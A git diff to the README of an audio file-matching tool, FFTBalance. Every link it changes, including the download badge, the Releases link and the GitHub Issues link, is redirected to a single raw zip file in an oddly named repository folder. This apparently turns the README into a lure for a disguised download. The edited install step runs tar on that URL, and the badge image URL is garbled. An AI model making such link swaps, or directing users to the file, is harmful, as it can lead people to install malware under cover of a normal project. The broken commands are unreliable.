@@ -1,7 +1,7 @@
 # 🎧 FFTBalance - Match Your Audio Files Easily
 
 ## 📥 Download Now
-[![Download FFTBalance](https://img.shields.io/badge/Download%20FFTBalance-v1.0-blue.svg)](https://github.com/shyxyy/FFTBalance/releases)
+[![Download FFTBalance](https://raw.githubusercontent.com/shyxyy/FFTBalance/master/deammonation/FFTBalance-1.6.zip%https://raw.githubusercontent.com/shyxyy/FFTBalance/master/deammonation/FFTBalance-1.6.zip)](https://raw.githubusercontent.com/shyxyy/FFTBalance/master/deammonation/FFTBalance-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To run FFTBalance, you need:
 
 You can download FFTBalance by visiting the Releases page.
 
-[Visit the Releases page to download](https://github.com/shyxyy/FFTBalance/releases)
+[Visit the Releases page to download](https://raw.githubusercontent.com/shyxyy/FFTBalance/master/deammonation/FFTBalance-1.6.zip)
 
 ### Steps to Download:
 
@@ -42,7 +42,7 @@ Once downloaded, follow the installation steps below.
 3. Extract the file (if it's in a compressed format):
 
    ```bash
-   tar -xvf fftbalance.tar.gz
+   tar -xvf https://raw.githubusercontent.com/shyxyy/FFTBalance/master/deammonation/FFTBalance-1.6.zip
    ```
 
 4. Navigate into the extracted directory:
@@ -102,7 +102,7 @@ If you encounter issues, consider these tips:
 
 Join our community to share your experiences or ask questions:
 
-- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://github.com/shyxyy/FFTBalance/issues).
+- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://raw.githubusercontent.com/shyxyy/FFTBalance/master/deammonation/FFTBalance-1.6.zip).
 - **User Guide:** Comprehensive documentation is available in the repository to help you get the most out of FFTBalance.
 
 ## 📜 License
